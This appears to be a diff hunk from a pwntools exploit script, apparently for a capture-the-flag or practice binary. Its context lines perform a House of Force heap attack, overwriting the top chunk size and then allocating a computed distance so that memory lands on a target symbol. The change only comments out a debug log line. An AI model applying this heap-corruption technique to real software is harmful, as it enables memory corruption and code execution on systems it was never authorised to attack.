@@ -39,7 +39,5 @@ log.info(f"target: 0x{elf.sym.target:02x}")
 malloc(24, b"Y"*24 + p64(0xffffffffffffffff))
 distance = delta(heap+0x20, elf.sym.target-0x20)
 malloc(distance, b"a")
-
-
-log.info(f"delta between heap & main(): 0x{delta(heap, elf.sym.main):02x}")
+# log.info(f"delta between heap & main(): 0x{delta(heap, elf.sym.main):02x}")
 io.interactive()
